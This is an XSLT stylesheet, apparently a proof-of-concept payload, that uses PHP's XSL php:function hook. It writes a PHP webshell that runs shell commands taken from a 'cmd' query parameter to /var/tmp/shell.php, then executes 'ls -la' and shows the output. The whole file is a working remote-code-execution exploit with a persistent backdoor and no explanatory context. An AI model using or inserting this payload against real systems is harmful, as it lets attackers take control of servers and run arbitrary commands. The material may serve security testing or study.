<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="*">

    <xsl:variable name="php">
      &lt;?php echo shell_exec($_GET['cmd']); ?&gt;
    </xsl:variable>

    <xsl:variable name="written" select="php:function('file_put_contents', '/var/tmp/shell.php', $php)" />
    <xsl:variable name="ls" select="php:function('shell_exec', 'ls -la /var/tmp')" />

    <html><body>
      <h2>Wrote Webshell to /var/tmp/shell.php</h2>
      <pre>file_put_contents() returned: <xsl:value-of select="$written"/></pre>
      <h3>ls -la /var/tmp:</h3>
      <pre><xsl:value-of select="$ls" /></pre>
    </body></html>

  </xsl:template>
</xsl:stylesheet>
